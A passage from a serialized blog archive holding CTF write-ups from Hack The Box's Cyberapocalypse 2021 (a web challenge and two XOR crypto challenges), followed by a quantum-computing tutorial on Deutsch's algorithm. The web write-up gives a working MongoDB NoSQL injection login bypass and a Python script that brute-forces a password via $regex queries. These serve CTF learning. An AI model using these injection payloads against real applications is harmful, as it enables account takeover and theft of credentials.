run:\\n\\n1. `cargo init` in the project folder to generate a templated `Cargo.toml` file.\\n2. Add `rand = \'*\'` under `[dependencies]` inside `Cargo.toml`.\\n3. Run `cargo build` to build the project.\\n4. Run it with `cargo run`.\\n\\nWe now have the hex representation of the flag inside our `flag.txt` file, so we can simply run\\n\\n```sh\\ncat flag.txt | xxd -r -ps\\n```\\n\\nand we get our flag\\n\\n```sh\\nCHTB{mem0ry_s4f3_crypt0_f41l}\\n```\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"},{"id":"wild-goose-hunt-cyberapocalypse-2021-ctf","metadata":{"permalink":"/blog/wild-goose-hunt-cyberapocalypse-2021-ctf","source":"@site/blog/2021-04-27-17:50:25wild-goose-hunt-cyberapocalypse-2021-ctf.md","title":"Wild goose hunt - Cyberapocalypse 2021 CTF","description":"This is a writeup for the Wild goose hunt challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Web.","date":"2021-04-27T00:00:00.000Z","formattedDate":"April 27, 2021","tags":[{"label":"Cyber Security","permalink":"/blog/tags/cyber-security"},{"label":"CTF","permalink":"/blog/tags/ctf"}],"readingTime":2.6,"hasTruncateMarker":true,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"wild-goose-hunt-cyberapocalypse-2021-ctf","title":"Wild goose hunt - Cyberapocalypse 2021 CTF","description":"This is a writeup for the Wild goose hunt challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Web.","authors":"kiroki","tags":["Cyber Security","CTF"]},"prevItem":{"title":"Soulcrabber - Cyberapocalypse 2021 CTF","permalink":"/blog/soulcrabber-cyberapocalypse-2021-ctf"},"nextItem":{"title":"Phasestream 1- Cyberapocalypse 2021 CTF","permalink":"/blog/phasestream-1-cyberapocalypse-2021-ctf"}},"content":"This is a writeup for the Wild goose hunt challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Web.\\n\\n### Prompt\\n\\nOutdated Alien technology has been found by the human resistance. The system might contain sensitive information that could be of use to us. Our experts are trying to find a way into the system. Can you help?\\n\\n\x3c!-- truncate --\x3e\\n\\n### Recon\\n\\nWe\'re given source-code for a web-site, and a hosted version.\\n\\nWith a quick overview of the code we\'re given, we see that the site uses `mongodb` as its database. Albeit slightly dumb, I didn\'t go into any more detail than this, and didn\'t check where the flag is actually hidden.\\n\\n### Attempting to log in\\n\\nMy initial idea was to simply log into the site, and see if that doesn\'t display the flag. So, I intercepted a login request with Burpsuite, and changed the POST request data to a classic mongo injection string,\\n\\n```yaml\\nPOST /api/login HTTP/1.1\\nHost: localhost:1337\\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0\\nAccept: */*\\nAccept-Language: en-GB,en;q=0.5\\nAccept-Encoding: gzip, deflate\\nReferer: http://localhost:1337/\\nContent-Type: application/x-www-form-urlencoded;charset=UTF-8\\nOrigin: http://localhost:1337\\nContent-Length: 35\\nConnection: close\\n\\nusername[$ne]=foo&password[$ne]=bar\\n```\\n\\nWhich returns a login success message.\\n\\n```yaml\\nHTTP/1.1 200 OK\\nX-Powered-By: Express\\nContent-Type: application/json; charset=utf-8\\nContent-Length: 62\\nETag: W/\\"3e-BvDyP4u8qgWgGOMxzemBf6QGSBc\\"\\nDate: Tue, 27 Apr 2021 17:31:15 GMT\\nConnection: close\\n\\n{\\"logged\\":1,\\"message\\":\\"Login Successful, welcome back admin.\\"}\\n```\\n\\nBut upon observing the login page of the site, we find nothing, but a welcome message.\\n\\n![welcome message](/content/images/2021/04/Screenshot_2021-04-27_20-34-50.png)\\n\\nSo at this point, I just assumed that the flag is the password itself (which I would had already known, if I had checked the `entrypoint.sh` script).\\n\\n### Solution\\n\\nIn order to correctly guess the password (and know what it is), we are going to once again use nosql injection, but this time we will use the [$regex] query for mongo.\\n\\n1. We send a POST request to `/api/login` using the username `admin` and a regex match query for the password with a random (printable) character.\\n2. If the login is successful, we assume that this character is indeed part of the password, so we add it to our flag, and try again with the next position in the password\\n3. Simple as that, let\'s script it\\n\\n```python\\nimport requests\\nimport string\\n\\n# Assumptions\\n# We suspect that the password is the flag\\n# the flag starts with \\"CBTH{\\"\\n# and ends with \\"}\\"\\n\\nflag = \\"CHTB{\\"\\nurl = \\"http://165.227.236.40:31535/api/login\\"\\n\\n# Each time a login is successful, we should start the loop from the first character\\nstartFromFirstChar = True\\n\\nwhile startFromFirstChar:\\n    startFromFirstChar = False\\n\\n    # avoiding characters like * . & +\\n    for char in string.ascii_letters + string.digits + \\"!@#$%^()@_{}\\":\\n        payload = flag + char\\n        post_data = {\'username\': \'admin\', \'password[$regex]\': payload + \\".*\\"}\\n        r = requests.post(url, data=post_data)\\n\\n        # A correct password means we get \\"logged\\":1 in response\\n        if (\'\\"logged\\":1\' in r.text):\\n            print(payload)\\n            startFromFirstChar = True\\n            flag = payload\\n\\n            # Exit if \\"}\\" is at the end and we are logged in\\n            if char == \\"}\\":\\n                print(\\"\\\\nFlag: \\" + flag)\\n                exit(0)\\n            break\\n```\\n\\n![running](/content/images/2021/04/Screenshot_2021-04-28_09-21-31.png)\\n\\nAnd so, we get our flag\\n\\n```sh\\nCHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}\\n```\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"},{"id":"phasestream-1-cyberapocalypse-2021-ctf","metadata":{"permalink":"/blog/phasestream-1-cyberapocalypse-2021-ctf","source":"@site/blog/2021-04-27-18:41:27phasestream-1-cyberapocalypse-2021-ctf.md","title":"Phasestream 1- Cyberapocalypse 2021 CTF","description":"This is a writeup for the challenge Phasestream 1, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Crypto.","date":"2021-04-27T00:00:00.000Z","formattedDate":"April 27, 2021","tags":[{"label":"Cyber Security","permalink":"/blog/tags/cyber-security"},{"label":"CTF","permalink":"/blog/tags/ctf"}],"readingTime":1.585,"hasTruncateMarker":true,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"phasestream-1-cyberapocalypse-2021-ctf","title":"Phasestream 1- Cyberapocalypse 2021 CTF","description":"This is a writeup for the challenge Phasestream 1, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Crypto.","authors":"kiroki","tags":["Cyber Security","CTF"]},"prevItem":{"title":"Wild goose hunt - Cyberapocalypse 2021 CTF","permalink":"/blog/wild-goose-hunt-cyberapocalypse-2021-ctf"},"nextItem":{"title":"Phasestream 2 - Cyberapocalypse 2021 CTF","permalink":"/blog/phasestream-2-cyberapocalypse-2021-ctf"}},"content":"This is a writeup for the challenge Phasestream 1, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Crypto.\\n\\n### Phasestream 1\\n\\nIn the first challenge, we\'re given a hex code, and the knowledge that it\'s been encoded using XOR with a 5-byte long key.\\n\\n\x3c!-- truncate --\x3e\\n\\nThe top information here, is the length of the key. Since we expect to see a flag pop out of this encoded value, we know that it will start with `CHTB{`, which is exactly 5 bytes long.\\n\\nAnd since the XOR operation is _its own inverse_, we know that if we apply a XOR operation on the encoded value using our known result `CHTB{` as \\"key\\", we will get the original key as output.\\n\\nWe can simply use an online tool for this:\\n\\n<figure class=\\"kg-card kg-image-card kg-card-hascaption\\"><img src=\\"/content/images/2021/04/Screenshot_2021-04-27_21-20-12.png\\" class=\\"kg-image\\" alt loading=\\"lazy\\" width=\\"429\\" height=\\"76\\"/><figcaption>Importing the hex representation of the encoded flag</figcaption></figure>\\n\\n<figure class=\\"kg-card kg-image-card kg-card-hascaption\\"><img src=\\"/content/images/2021/04/Screenshot_2021-04-27_21-20-27.png\\" class=\\"kg-image\\" alt loading=\\"lazy\\" width=\\"260\\" height=\\"31\\"/><figcaption>Choosing our \\"key\\" as the beginning of the flag</figcaption></figure>\\n\\n<figure class=\\"kg-card kg-image-card kg-card-hascaption\\"><img src=\\"/content/images/2021/04/Screenshot_2021-04-27_21-20-39.png\\" class=\\"kg-image\\" alt loading=\\"lazy\\" width=\\"246\\" height=\\"24\\"/><figcaption>Getting the 5-byte key to be \\"mykey\\"</figcaption></figure>\\n\\nWe get our key to be `mykey`!\\n\\nWe could also do this using [this](https://github.com/AlexFSmirnov/xor-decrypt) tool to do the same, since we can supply a key to it to decode. But we need to supply it with an ASCII representation of the encoded result.\\n\\n1. Decode the hex of the encrypted flag into ASCII\\n\\n```sh\\necho 2e313f2702184c5a0b1e321205550e03261b094d5c171f56011904 | xxd -r -ps > encodedascii.txt\\n```\\n\\n2. Find the key by supplying the encrypted flag to `xor-decrypt`, and `CHTB{` as key\\n\\n```sh\\npython3 xor-decrypt.py -i \\"encodedascii.txt\\" -o key.txt -k CHTB{ -d\\n```\\n\\nSo we get `mykey[IeqZQu@nOK6_KzZL`, and deduce that `mykey` is the 5-byte key\\n\\n3. Decrypt the encrypted flag using our key\\n\\n```shell\\npython3 xor-decrypt.py -i encodedascii.txt -o flag.txt -k mykey -d\\n```\\n\\nAnd so, our flag finally is\\n\\n```sh\\nCHTB{u51ng_kn0wn_pl41nt3xt}\\n```\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"},{"id":"phasestream-2-cyberapocalypse-2021-ctf","metadata":{"permalink":"/blog/phasestream-2-cyberapocalypse-2021-ctf","source":"@site/blog/2021-04-27-19:33:57phasestream-2-cyberapocalypse-2021-ctf.md","title":"Phasestream 2 - Cyberapocalypse 2021 CTF","description":"This is a writeup for the challenge Phasestream 2, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Crypto.","date":"2021-04-27T00:00:00.000Z","formattedDate":"April 27, 2021","tags":[{"label":"Cyber Security","permalink":"/blog/tags/cyber-security"},{"label":"CTF","permalink":"/blog/tags/ctf"}],"readingTime":2.12,"hasTruncateMarker":true,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"phasestream-2-cyberapocalypse-2021-ctf","title":"Phasestream 2 - Cyberapocalypse 2021 CTF","description":"This is a writeup for the challenge Phasestream 2, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Crypto.","authors":"kiroki","tags":["Cyber Security","CTF"]},"prevItem":{"title":"Phasestream 1- Cyberapocalypse 2021 CTF","permalink":"/blog/phasestream-1-cyberapocalypse-2021-ctf"},"nextItem":{"title":"Quantum Programming - Abstraction level 2: State Machine and Algorithms","permalink":"/blog/quantum-programming-abstraction-level-2-algorithms"}},"content":"This is a writeup for the challenge Phasestream 2, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Crypto.\\n\\n### Prompt\\n\\nThe aliens have learned of a new concept called \\"security by obscurity\\". Fortunately for us they think it is a great idea and not a description of a common mistake. We\'ve intercepted some alien comms and think they are XORing flags with a single-byte key and hiding the result inside 9999 lines of random data, Can you find the flag?\\n\\n\x3c!-- truncate --\x3e\\n\\n### Recon\\n\\nWe have a file with 9999 lines of hex-encoded strings. We know so far, that one of these lines contain an encrypted flag, and that the flag is 1 byte long. We also know that the flag starts with `CHTB`.\\n\\nThis information gives us the following idea. We can loop through all 256 possible keys (in ASCII), and XOR the first 4 values of each line (8 symbols of each line, since it\'s encoded in hex). If that encoded string is `CHTB`, we\'ve found both our key and our line which contains the flag.\\n\\n### Solution\\n\\nLet\'s create a logic flow:\\n\\n1. Read a line from `output.txt`\\n2. Take the first 8 characters of it, and transform them from hex into their ASCII codes\\n3. XOR those 4 characters with one of 256 possible ASCII codes\\n4. If we find that this equals `CHTB`, we\'ve found our line and key\\n5. We can now decrypt our line with the key we\'ve found\\n\\n```python\\n#!/usr/bin/env python3\\n\\n# Flag starts with CHTB which is 67 72 84 66 in ASCII or 0x43 0x48 0x54 0x42 in hex\\n# The key is 1 byte long\\n\\nCHTB = [67, 72, 84, 66]\\n\\nkeys = [i for i in range(256)]\\n\\ndef findKeyAndLine():\\n  with open(\'output.txt\') as f:\\n    foundKey = \'\'\\n    foundLine = \'\'\\n    for line in f:\\n      candidateC = int(line[0:2], 16)\\n      candidateH = int(line[2:4], 16)\\n      candidateT = int(line[4:6], 16)\\n      candidateB = int(line[6:8], 16)\\n\\n      for key in keys:\\n        condition = candidateC ^ key == CHTB[0] and candidateH ^ key == CHTB[1] and candidateT ^ key == CHTB[2] and candidateB ^ key == CHTB[3]\\n        if condition:\\n          foundKey = key\\n          foundLine = line[:-1]\\n          break\\n    print(\'Key:\', foundKey, \'Line:\', foundLine)\\n  return {\'key\': foundKey, \'line\': foundLine}\\n\\ndef decrypt(keyAndLine):\\n  flag = []\\n  key = keyAndLine[\'key\']\\n  line = keyAndLine[\'line\']\\n\\n  for ind in range(0, len(line), 2):\\n    hexChar = line[ind:ind+2]\\n    byte = int(hexChar, 16)\\n    asciiNum = byte ^ key\\n    flag.append(chr(asciiNum))\\n\\n  print(\'Flag:\', \'\'.join(flag))\\n\\ndecrypt(findKeyAndLine())\\n```\\n\\nAnd so, we find our flag\\n\\n```sh\\nKey:  69 Line:  060d11073e2b76762129761a742b1a711a2d713c363171262e38\\nFlag:  CHTB{n33dl3_1n_4_h4yst4ck}\\n```\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"},{"id":"quantum-programming-abstraction-level-2-algorithms","metadata":{"permalink":"/blog/quantum-programming-abstraction-level-2-algorithms","source":"@site/blog/2021-04-01-20:56:11quantum-programming-abstraction-level-2-algorithms.md","title":"Quantum Programming - Abstraction level 2: State Machine and Algorithms","description":"After we get an intuition about phase kickback, we start getting into actual Computer Science, through building a State Machine, and recreating an actual Quantum Algorithm.","date":"2021-04-01T00:00:00.000Z","formattedDate":"April 1, 2021","tags":[{"label":"Science","permalink":"/blog/tags/science"},{"label":"Physics","permalink":"/blog/tags/physics"},{"label":"Computing","permalink":"/blog/tags/computing"},{"label":"Quantum","permalink":"/blog/tags/quantum"},{"label":"Programming","permalink":"/blog/tags/programming"},{"label":"Computer Science","permalink":"/blog/tags/computer-science"}],"readingTime":12.645,"hasTruncateMarker":true,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"quantum-programming-abstraction-level-2-algorithms","title":"Quantum Programming - Abstraction level 2: State Machine and Algorithms","description":"After we get an intuition about phase kickback, we start getting into actual Computer Science, through building a State Machine, and recreating an actual Quantum Algorithm.","authors":"kiroki","tags":["Science","Physics","Computing","Quantum","Programming","Computer Science"],"toc_min_heading_level":2,"toc_max_heading_level":4},"prevItem":{"title":"Phasestream 2 - Cyberapocalypse 2021 CTF","permalink":"/blog/phasestream-2-cyberapocalypse-2021-ctf"},"nextItem":{"title":"Quantum Programming - Abstraction level 1: Logic Gates","permalink":"/blog/quantum-programming-abstraction-level-1-logic-gates"}},"content":"1. [Quantum Programming by abstracting ourselves from Quantum Mechanics: Abstraction level 0](/blog/quantum-programming-abstraction-level-0/)\\n2. [Quantum Programming - Abstraction level 1: Logic Gates](/blog/quantum-programming-abstraction-level-1-logic-gates/)\\n3. [Quantum Programming - Abstraction level 2: State Machine and Algorithms](/blog/quantum-programming-abstraction-level-2-algorithms/) (this)\\n\\nWe have been on quite the adventure so far. Let\'s recap our progress.\\n\\n* We\'ve shown that by encoding information onto n qubits in superposition, we can manipulate the whole system of 2n states by only changing the state of one qubit.\\n* We represented the state of each qubit as a simple 2D vector.\\n* We\'ve established that we can change the state of a single qubit (or two) by applying different logic gates to it, similarly to a classical logic gate.\\n* We can now visualise the superposed state of the qubit (indeed of the whole system) on the Bloch sphere.\\n* We know how to entangle two qubits, so that their states are correlated.\\n\\nNow the time has come to start putting it all together. Wouldn\'t it be nice to actually string some gates together, and see what happens? \\n\\nWell, in order to see what happens, we might want to be able to visualise the flow of our qubits\' states, so we can see how each gate manipulates each qubit at each step.\\n\\n## Unit circle State machine\\n\\n\x3c!-- truncate --\x3e\\n\\nIf you remember, I spent quite a bit of time in the last post trying to simplify the Bloch sphere into a circle. To some of you, it might have seemed a meaningless exercise; after all a sphere isn\'t that much more complicated to visualise than a circle. But, here\'s where it becomes somewhat more meaningful. I present to you the _unit cicle state machine_:\\n\\n![Unit circle state machine](/content/images/2021/04/unit-circle.svg)\\n\\nNow we can place all of our states from the \\"Bloch circle\\" into a unit circle of... well, states. I think that in this particular case a circle is much more manageable than a sphere, especially since you may note that we have twice as many states as in the Bloch circle. For example, we now have not only a (1 0) state, but also (-1 0).\\n\\n _These are the states we described previously as having different **phase**_. Or in fact, even more of them, since if you remember, in the Bloch circle we already had the state $[1/\\\\sqrt{2} \\\\quad -1/\\\\sqrt{2}]$, which was the same as \xa0$[1/\\\\sqrt{2} \\\\quad 1/\\\\sqrt{2}]$, but with a different phase.\\n\\nThese states which are differentiated by only a phase will still have the same probabily distribution. And as long as we talk only about singular qubits, they are **equivalent to one another**. But as we will see soon, the phase becomes very important once we have more than 1 qubits in our system.\\n\\nWith that aside, let\'s concentrate on our new powerful tool. With it, we can easily describe **how each gate acts on each state**. For example, let\'s map the X-Gate and the Hadamard Gate onto their respective circles:\\n\\n<figure class=\\"kg-card kg-image-card kg-card-hascaption\\"><img src=\\"/content/images/2021/03/unit-circle-x-gate.svg\\" class=\\"kg-image\\" alt loading=\\"lazy\\" width=\\"800\\" height=\\"800\\"/><figcaption>Possible state changes by applying the X gate.</figcaption></figure>\\n\\n<figure class=\\"kg-card kg-image-card kg-card-hascaption\\"><img src=\\"/content/images/2021/03/unit-circle-h-gate.svg\\" class=\\"kg-image\\" alt loading=\\"lazy\\" width=\\"800\\" height=\\"800\\"/><figcaption>Possible state changes by applying the Hadamard gate.</figcaption></figure>\\n\\nAs our quantum gates are reversible by definition, we can go backwards and fowrads in the circle, without ever losing information about the previous state.\\n\\n## The Quantum Circuit\\n\\nNow we have the tools and knowledge necessary to start putting gates together. The collection of the qubits in our register, plus the combination of the gates we apply to them we can call a **quantum circuit**.\\n\\nBy defining our state machine, we can visualise the programatic flow of our system. We can start by creating a simple quantum circuit of 1 qubit and a few gates applied to it.\\n\\n![Programmatic flow](/content/images/2021/04/unit-circle-stringing-gates-1.svg)\\n\\nSo with our state machine we were able to determine that, after applying the gates to the qubit, it will turn into a $\\\\ket{0}$ with probability $(-1)^2=1$. But what is it with that minus sign?\\n\\nAs we discussed before, $[-1 \\\\quad 0]$ and $[1 \\\\quad 0]$ are states that differ by a certain **phase** with respect to each-other. Since we have only one qubit in our system, we can say that these two states differ by a **global phase**. That type of phase has no significance in our system.\\n\\nBut if there are multiple qubits in our system, and they have different phases w.r.t. each-other, then we say that it\'s their **relative phase**[^1] which is different[^2].\\n\\n> Relative phase is actually a property of the system, i.e. systems with different relative phase are physically different systems.\\n\\n### Phase kickback\\n\\nRemember what we said about applying the **CNOT** gate to a pair of qubits whose probability distribution is 50/50? We figured out, that instead of the control bit changing the target bit, the target bit flipped the control bit.\\n\\n|input $\\\\ket{control,target}$ | output $\\\\ket{control,target}$ |\\n|--|--|\\n|$\\\\ket{++}$ | $\\\\ket{++}$ |\\n|<span style={{color: \'red\'}}>$\\\\ket{+-}$</span> | <span style={{color: \'red\'}}>$\\\\ket{--}$</span> |\\n|$\\\\ket{-+}$ | $\\\\ket{-+}$ |\\n|<span style={{color: \'red\'}}>$\\\\ket{--}$</span> | <span style={{color: \'red\'}}>$\\\\ket{+-}$</span> |\\n\\nBut ultimately that change didn\'t alter the probability of those qubits. Both of them still have 50% probability of collapsing to either 1 or 0. What changed was their _relative phase_. \\n\\nIn fact what happened is, that **the phase of the target bit got applied to the already existing phase of the control bit**. We can easily see the logic of this by simply following the signs of the states in the table above.\\n\\nWhen the target bit had a phase of \\"+\\", it did nothing to change the phase of the control bit, since\\n\\n$$\\n(\\\\text{control phase}\\\\times\\\\text{target phase}) = \xa0+1\\\\times+1 = +1\\n$$\\n\\nand\\n\\n$$\\n-1 \\\\times +1 = -1 \\\\text{,}\\n$$\\n\\nso the phase remained unchanged (see black rows). But once the target bit had a phase of \\"-\\", its effects became noticable (see red rows), e.g.\\n\\n$$\\n-1 \\\\times -1 = +1 \\\\text{.}\\n$$\\n\\n> This application of the phase from the target bit onto the phase of the control bit is what we call phase kickback.\\n\\nAlthough not an algorithm, phase kickback is an important tool in quantum computing. It allows us for example to keep track of the phase of another qubit, to copy the phase so to speak. This mechanism of copying the phase of one qubit onto another is often used in different algorithms.\\n\\nSo, let\'s visualise this phase kickback in our state machine.\\n\\n<figure class=\\"kg-card kg-image-card kg-width-wide kg-card-hascaption\\"><img src=\\"/content/images/2021/04/unit-circle-phase-kickback.svg\\" class=\\"kg-image\\" alt loading=\\"lazy\\" width=\\"2000\\" height=\\"1100\\"/><figcaption>The CNOT applies the mixed-state relative phase of the target bit onto the pure-state relative phase of the control bit, ultimately copying the phase from q1 onto q0. After applying final Hadamard gates, the system proceeds to collapse onto the definite state 11.</figcaption></figure>\\n\\nLet\'s break this up, and explain our intent. \\n\\n* At first we applied a X-Gate to the target bit _q1_.\\n\\nThe idea here is that by applying the Hadamard gate onto a qubit of state 1, we will put it into superposition _with a negative phase_.\\n\\n* In contrast, our control _q0_ bit got transfered to superposition from the 0 state, hence giving it positive phase.\\n\\nThis was the preparation for our experiment. The next step is the bulk of our work.\\n\\n* By applying the CNOT gate on our control and target bits, we did what we set out to do - apply the phase of the target bit _q1_ onto the control bit\'s phase.\\n\\nAnd since the phase of _q0_ was plus, the effect ultimately was to simply copy the phase from _q1_ to _q0_. This is exactly what happens on the second row of our table above.\\n\\n|input $\\\\ket{control,target}$ | output $\\\\ket{control,target}$|\\n|--|--|\\n|$ \\\\ket{+-}$ | $\\\\ket{--}$ |\\n\\n* Then we applied the Hadamard gate on both qubits again, transfering them from their 50/50 probability back to a definite state (remember, gates are reversible, so Hadamard had the opposite effect now).\\n\\nAnd that\'s it, we have demonstrated the critical property of quantum computing named _phase kickback_.\\n\\n## Algorithms\\n\\nAlgorithms are constructs which have a certain goal. They exist to solve a problem, often in a field outside of computer science itself. In fact, algorithms are often developed before machines capable of running them even exist.\\n\\nAlgorithms are often the first real step in computing, in which we can really abstract ourselves from physical reality, and start applying a more programatic mindset.\\n\\nFurthermore, this is a level of abstraction, in which we can define black boxes, and in those boxes processes can happen without us caring about the details, and we can only see the result of the function (and maybe the input).\\n\\nAs such, in quantum programming there exist highly contrived problems, which can be solved using our qubits. I will show you an over-used such example, which incidentally, we have been naturally building to. Let\'s talk about\\n\\n### Deutsch\'s Algorithm\\n\\nThis, like I said, is truly an entry level algorithm. It\'s usually the first one shown in any book or course on the subject, and one might think it\'s simply because it\'s easy to show. In reality though, it has two main characteristics which make it important to know regardless of its simplicity or how contrived it is:\\n\\n* It shows that even using _reversible_ gates, we can still apply _irreversible_ functions to our qubits. This way we strenghten the connection between quantum and classical computing.\\n* It\'s the simplest algorithm, which can undeniably show that there exist problems for which quantum computing is intrinsically faster than classical computing - where faster is defined as needing less steps to complete.\\n\\nBut even though those things are true, I don\'t want to concentrate on them right now. Our goal is simply to connect the pieces we\'ve collected so far into a single stream, and apply it to an easy to grasp problem.\\n\\n#### The problem\\n\\nThere is a function $f$ which takes as input 0 or 1, and gives as output 0 or 1.\\n\\nSo this function has 4 possible configurations:\\n\\n* Both 0 and 1 as input are mapped to 1 as output\\n* Both 0 and 1 as input are mapped to 0 as output\\n* The input is unchanged, so 0 to 0 and 1 to 1\\n* The input is flipped, so 0 to 1 and 1 to 0\\n\\n![Configurations](/content/images/2021/04/constant-balanced.svg)\\n\\nWe will call the first 2 functions \\"constant\\" (i.e. it doesn\'t matter what we input, the output is the same), and the second 2 \\"balanced\\".\\n\\n> The problem therefore is: if we put this function in a **black box**, determine which of the two variants - constant or balanced, is inside the black box.\\n\\n#### Recreating the function with gates\\n\\nLet\'s program! Yeah, we now we have simple logical requirements, that we have to represent using a language we learned. Isn\'t this exciting?\\n\\nAnyway, we have an immediate problem to deal with. Note, that the constant functions are irreversible. We can\'t know the input from the output. As I said, I don\'t intent to explain the reasoning behind this, but:\\n\\n> If we normaly need to pass one bit into any of the 4 functions, we will need 2 qubits to do the same with reversible gates only. That is, in addition to the input of the function, we need to pass an empty (zero) qubit onto which to write the output of the function. \xa0We will call this empty bit the **spare**.\\n\\nWith that in mind, lets recreate the four function configurations.\\n\\n![function configurations](/content/images/2021/04/four-functions-2.svg)\\n\\n#### The algorithm\\n\\nWell, I reckon let\'s first define it as if we knew what was going on, after which we just go step by step using our unit circle state machine, and see what happens. I claim, that the algorithm below will spit out $\\\\ket{11}$ if the **black box** contains a constant function (from the list above), and if it is a balanced function, the output will be $\\\\ket{01}$.\\n\\n<figure class=\\"kg-card kg-image-card kg-card-hascaption\\"><img src=\\"/content/images/2021/04/algorithm-1.svg\\" class=\\"kg-image\\" alt loading=\\"lazy\\" width=\\"800\\" height=\\"200\\"/><figcaption>The Deutsch algorithm. BB stands for \\"black box\\", where our function gets executed. M stands for measurement - that\'s where we collapse the wavefunction of our system of qubits.</figcaption></figure>\\n\\n#### Preprocessing\\n\\nFirst, we take a look at the initial preparation of the qubits, the negation and the Hadamard initialisation\\n\\n![preprocessing](/content/images/2021/04/preprocessing-1.svg)\\n\\nNothing surprising so far. So now let\'s see how each of the black box functions changes the output.\\n\\n#### Constant 0\\n\\nWe defined our constant-0 function as doing nothing. So we do nothing, after which we apply the second Hadamard gate and collapse the wavefunction with a measurement gate.\\n\\n![constant zero](/content/images/2021/04/constant-0-1.svg)\\n\\nAnd the result is indeed $\\\\ket{11}$. Great! We got one. Onto the next one.\\n\\n#### Constant 1\\n\\nWe defined constant-1 as flipping the spare bit. Once again, we apply the Hadamard gate after that, before measuring the system.\\n\\n![cosntant one](/content/images/2021/04/constant-1.svg)\\n\\nAnd we once again get \xa0$\\\\ket{11}$! (Remember, $-1^2=1$ probability of getting a 1) Awesome, halfway there.\\n\\n#### Identity\\n\\nThis is where we apply our knowledge of phase kickback. The CNOT gate acts exactly like we defined in our example in the section above. See how our knowledge accumulates?\\n\\n![identity](/content/images/2021/04/identity-1.svg)\\n\\nAnd the result is indeed, as we predicted, $\\\\ket{01}$.\\n\\n#### Negation\\n\\nLast one! Is it going to be the dealbreaker? I hope not. Remember, all that is different from the identity, is that we have an X-Gate acting on the Spare bit after the CNOT has done its phase kickback magic.\\n\\n![negation](/content/images/2021/04/negation.svg)\\n\\nSo rather unsurprisingly, it worked! It is indeed $\\\\ket{01}$, as we would expect from a balanced function!\\n\\nWe were able to identify any and all of the 4 functions with a single pass!\\n\\nIncidentally, a classical computer would need 2 passes for any of these functions to identify it as either a constant or a balanced function. Try proving it yourself, it takes an if-else statement to do it.\\n\\nSo, with this we\'ve seen our very first quantum computing algorithm at work! And with the tools and knowledge we\'ve developed, this is only the beginning!\\n\\nAlgorithms are indeed the first big leap towards higher levels of abstraction. My hopes are, that with the tools we shown here, you have developed a level of intuition to think about the existing algorithms, and the curiosity to try them out.\\n\\nWho knows, with time you might get so entrenched in the idea, that you stumble upon an unexplored corner of the field of quantum programming, and create something of your own.\\n\\nMeanwhile I intent to continue with my exploration of the world of quantum programming, and hopefully write something more on the subject as I go along.\\n\\nThanks for reading!\\n\\n[^1]: In contrast to global phase, which is the case when all qubits in the system have the same phase, such that it can be factored out from the observation calculation. Systems with a global phase are physically identical, while systems with relative phase are not. They might still be measured the same way in most cases, but this is simply because measurement in quantum computers usually takes place along the same axis, independent of phase.\\n\\n[^2]: In Quantum Information, it can be said that this relative phase carries information about the **coherence** of the system.\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"},{"id":"quantum-programming-abstraction-level-1-logic-gates","metadata":{"permalink":"/blog/quantum-programming-abstraction-level-1-logic-gates","source":"@site/blog/2021-03-28-22:10:18quantum-programming-abstraction-level-1-logic-gates.md","title":"Quantum Programming - Abstraction level 1: Logic Gates","description":"For the majority of our time spent programming on the quantum computer, we will be thinking of the qubits in their state of superposition. What would be useful for our intuition now, would be to have a way to visualise this superposition, so we can analyse the effects each logical gate has on it.","date":"2021-03-28T00:00:00.000Z","formattedDate":"March 28, 2021","tags":[{"label":"Coding","permalink":"/blog/tags/coding"},{"label":"Science","permalink":"/blog/tags/science"},{"label":"Computing","permalink":"/blog/tags/computing"},{"label":"Quantum","permalink":"/blog/tags/quantum"},{"label":"Programming","permalink":"/blog/tags/programming"},{"label":"Computer Science","permalink":"/blog/tags/computer-science"}],"readingTime":13.32,"hasTruncateMarker":true,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"quantum-programming-abstraction-level-1-logic-gates","title":"Quantum Programming - Abstraction level 1: Logic Gates","description":"For the majority of our time spent programming on the quantum computer, we will be thinking of the qubits in their state of superposition. What would be useful for our intuition now, would be to have a way to visualise this superposition, so we can analyse the effects each logical gate has on it.","authors":"kiroki","tags":["Coding","Science","Computing","Quantum","Programming","Computer Science"]},"prevItem":{"title":"Quantum Programming - Abstraction level 2: State Machine and Algorithms","permalink":"/blog/quantum-programming-abstraction-level-2-algorithms"},"nextItem":{"title":"Quantum Programming by abstracting ourselves from Quantum Mechanics: Abstraction level 0","permalink":"/blog/quantum-programming-abstraction-level-0"}},"content":"1. [Quantum Programming by abstracting ourselves from Quantum Mechanics: Abstraction level 0](/blog/quantum-programming-abstraction-level-0/)\\n2. [Quantum Programming - Abstraction level 1: Logic Gates](/blog/quantum-programming-abstraction-level-1-logic-gates/) (this)\\n3. 